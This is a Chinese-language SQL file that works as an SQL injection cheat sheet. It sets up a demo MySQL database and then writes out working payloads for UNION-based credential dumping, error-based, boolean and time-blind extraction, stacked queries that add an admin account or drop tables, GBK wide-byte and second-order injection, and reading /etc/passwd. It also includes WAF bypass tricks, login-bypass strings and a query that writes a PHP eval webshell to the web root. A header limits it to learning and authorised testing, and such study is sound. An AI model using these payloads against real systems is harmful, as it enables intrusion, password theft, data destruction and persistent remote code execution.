-- sql_injection_examples.sql
-- SQL 注入利用示例（仅用于安全学习和授权测试，禁止非法用途）

-- =============================================
-- 准备：创建测试数据库和表
-- =============================================
CREATE DATABASE IF NOT EXISTS sqli_demo DEFAULT CHARSET utf8mb4;
USE sqli_demo;

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(100) NOT NULL,
    email VARCHAR(100),
    role VARCHAR(20) DEFAULT 'user'
);

INSERT INTO users (username, password, email, role) VALUES
    ('admin', 'admin123', 'admin@example.com', 'admin'),
    ('zhangsan', '123456', 'zhangsan@example.com', 'user'),
    ('lisi', '123456', 'lisi@example.com', 'user'),
    ('wangwu', '123456', 'wangwu@example.com', 'user');

CREATE TABLE IF NOT EXISTS articles (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(200),
    content TEXT,
    author_id INT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO articles (title, content, author_id) VALUES
    ('第一篇文章', '这是文章内容', 1),
    ('第二篇文章', '这是第二篇文章内容', 2);

-- =============================================
-- 一、联合查询注入（UNION Injection）
-- =============================================

-- 场景：?id=1  后端 SQL：SELECT * FROM articles WHERE id = $_GET['id']

-- 1. 判断注入类型
-- 数字型测试
SELECT * FROM articles WHERE id = 1 AND 1=1;   -- 正常
SELECT * FROM articles WHERE id = 1 AND 1=2;   -- 无结果 → 存在注入

-- 2. 判断字段数（ORDER BY）
SELECT * FROM articles WHERE id = 1 ORDER BY 4;  -- 正常
SELECT * FROM articles WHERE id = 1 ORDER BY 5;  -- 报错 → 4 个字段

-- 3. 判断显示位
SELECT * FROM articles WHERE id = -1 UNION SELECT 1,2,3,4;

-- 4. 获取基本信息
SELECT * FROM articles WHERE id = -1
UNION SELECT
    version(),     -- 数据库版本
    database(),    -- 当前数据库
    user(),        -- 当前用户
    @@datadir;     -- 数据目录

-- 5. 获取所有数据库
SELECT * FROM articles WHERE id = -1
UNION SELECT 1, group_concat(schema_name), 3, 4
FROM information_schema.schemata;

-- 6. 获取当前库的所有表
SELECT * FROM articles WHERE id = -1
UNION SELECT 1, group_concat(table_name), 3, 4
FROM information_schema.tables
WHERE table_schema = database();

-- 7. 获取 users 表的列
SELECT * FROM articles WHERE id = -1
UNION SELECT 1, group_concat(column_name), 3, 4
FROM information_schema.columns
WHERE table_name = 'users' AND table_schema = database();

-- 8. 脱库：获取所有用户名和密码
SELECT * FROM articles WHERE id = -1
UNION SELECT
    id,
    concat(username, 0x3a, password),  -- 用冒号分隔
    email,
    role
FROM users;

-- 多行结果合并成一行
SELECT * FROM articles WHERE id = -1
UNION SELECT
    1,
    group_concat(username, ':', password separator '<br>'),
    3,
    4
FROM users;

-- =============================================
-- 二、报错注入（Error-based Injection）
-- =============================================

-- updatexml()
SELECT * FROM articles WHERE id = 1
AND updatexml(1, concat(0x7e, (SELECT version()), 0x7e), 1);

-- extractvalue()
SELECT * FROM articles WHERE id = 1
AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e));

-- 获取表名
SELECT * FROM articles WHERE id = 1
AND updatexml(1, concat(0x7e,
    (SELECT table_name FROM information_schema.tables
     WHERE table_schema=database() LIMIT 0,1),
0x7e), 1);

-- 获取列名
SELECT * FROM articles WHERE id = 1
AND updatexml(1, concat(0x7e,
    (SELECT column_name FROM information_schema.columns
     WHERE table_name='users' LIMIT 0,1),
0x7e), 1);

-- 获取数据
SELECT * FROM articles WHERE id = 1
AND updatexml(1, concat(0x7e,
    (SELECT concat(username, ':', password) FROM users LIMIT 0,1),
0x7e), 1);

-- =============================================
-- 三、布尔盲注（Boolean Blind Injection）
-- =============================================

-- 判断数据库名长度
SELECT * FROM articles WHERE id = 1 AND length(database()) > 5;
-- 页面正常 → 长度 > 5
SELECT * FROM articles WHERE id = 1 AND length(database()) > 10;
-- 页面不正常 → 长度 <= 10

-- 猜数据库名第一个字符（ASCII 码，二分法）
SELECT * FROM articles WHERE id = 1 AND ascii(substr(database(),1,1)) > 100;
SELECT * FROM articles WHERE id = 1 AND ascii(substr(database(),1,1)) > 110;
-- 逐步缩小范围，最终确定字符

-- 猜表名
SELECT * FROM articles WHERE id = 1
AND ascii(substr(
    (SELECT table_name FROM information_schema.tables
     WHERE table_schema=database() LIMIT 0,1),
1,1)) > 97;

-- 猜数据
SELECT * FROM articles WHERE id = 1
AND ascii(substr(
    (SELECT password FROM users WHERE username='admin' LIMIT 0,1),
1,1)) > 97;

-- =============================================
-- 四、时间盲注（Time-based Blind Injection）
-- =============================================

-- 基础延时
SELECT * FROM articles WHERE id = 1 AND SLEEP(5);

-- 条件延时：如果数据库名第一个字符是 's'，则延时 5 秒
SELECT * FROM articles WHERE id = 1
AND IF(ascii(substr(database(),1,1)) = 115, SLEEP(5), 0);

-- 判断数据库名长度
SELECT * FROM articles WHERE id = 1
AND IF(length(database()) = 9, SLEEP(5), 0);

-- 猜表名
SELECT * FROM articles WHERE id = 1
AND IF(ascii(substr(
    (SELECT table_name FROM information_schema.tables
     WHERE table_schema=database() LIMIT 0,1),
1,1)) = 117, SLEEP(5), 0);

-- 猜密码
SELECT * FROM articles WHERE id = 1
AND IF(ascii(substr(
    (SELECT password FROM users WHERE username='admin' LIMIT 0,1),
1,1)) = 97, SLEEP(5), 0);

-- =============================================
-- 五、堆叠注入（Stacked Queries）
-- =============================================

-- 注意：堆叠注入需要数据库支持多语句执行（如 MSSQL、mysqli_multi_query）
-- MySQL 的 PHP mysql/mysqli 一般不支持堆叠，但某些场景可能支持

-- 添加用户
SELECT * FROM articles WHERE id = 1;
INSERT INTO users(username, password, role) VALUES('hacker', 'hacker123', 'admin');

-- 删除表
SELECT * FROM articles WHERE id = 1;
DROP TABLE users;

-- =============================================
-- 六、宽字节注入
-- =============================================

-- 场景：PHP 使用 addslashes() 或 magic_quotes_gpc 转义单引号
-- 数据库使用 GBK 编码时，%df 加上转义的 \ 会组成一个汉字

-- 正常：?id=1'  → 被转义为 id=1\'
-- 注入：?id=1%df' → 转义后 id=1%df\' → %df\ 组成 GBK 汉字 → 单引号逃逸
SELECT * FROM articles WHERE id = 1運' AND 1=1#;

-- =============================================
-- 七、二次注入
-- =============================================

-- 第一步：注册用户，用户名包含注入语句
INSERT INTO users(username, password) VALUES('admin' -- ', '123456');

-- 第二步：修改密码时，取出用户名拼接到 SQL 中触发注入
-- UPDATE users SET password='newpass' WHERE username='admin' -- ' AND password='oldpass'
-- 等价于只修改了 admin 的密码

-- =============================================
-- 八、文件读写（需要 FILE 权限）
-- =============================================

-- 读文件
SELECT * FROM articles WHERE id = -1
UNION SELECT 1, load_file('/etc/passwd'), 3, 4;

-- Windows 下读文件
SELECT * FROM articles WHERE id = -1
UNION SELECT 1, load_file('c:\\windows\\system32\\drivers\\etc\\hosts'), 3, 4;

-- 写文件（写 Webshell）
SELECT '<?php eval($_POST["cmd"]);?>'
INTO OUTFILE '/var/www/html/shell.php';

-- =============================================
-- 九、绕过技巧
-- =============================================

-- 空格绕过
SELECT/**/*/**/FROM/**/users/**/WHERE/**/id=1;

-- 注释绕过
SELECT * FROM users WHERE id = 1 -- 注释掉后面内容;
SELECT * FROM users WHERE id = 1 # 注释掉后面内容;
SELECT * FROM users WHERE /* 中间注释 */ id = 1;

-- 大小写绕过（部分 WAF）
SELECT * FROM users WHERE id = 1 uNiOn sElEcT 1,2,3;

-- 双写绕过（WAF 只替换一次）
SELECT * FROM users WHERE id = 1 UNIunionON SELselectECT 1,2,3;

-- 编码绕过
-- URL 编码: %53%45%4C%45%43%54 = SELECT

-- 等价函数绕过
-- hex() → ascii() → ord()
-- sleep() → benchmark()
-- union select → union all select

-- =============================================
-- 十、登录绕过示例
-- =============================================

-- 正常登录 SQL
SELECT * FROM users WHERE username='admin' AND password='123456';

-- 绕过方式 1：用户名注入
-- 输入用户名: admin' -- 
SELECT * FROM users WHERE username='admin' -- ' AND password='xxx';

-- 绕过方式 2：密码注入
-- 输入密码: ' OR '1'='1
SELECT * FROM users WHERE username='xxx' AND password='' OR '1'='1';

-- 绕过方式 3：万能密码
-- 用户名: ' OR 1=1 #
-- 密码: 任意
SELECT * FROM users WHERE username='' OR 1=1 #' AND password='xxx';

-- 绕过方式 4：联合查询伪造用户
-- 用户名: ' UNION SELECT 1,'admin','123456','admin@test.com','admin' #
SELECT * FROM users WHERE username='' UNION SELECT 1,'admin','123456','admin@test.com','admin' #' AND password='xxx';

-- =============================================
-- 清理测试数据
-- =============================================
-- DROP DATABASE sqli_demo;
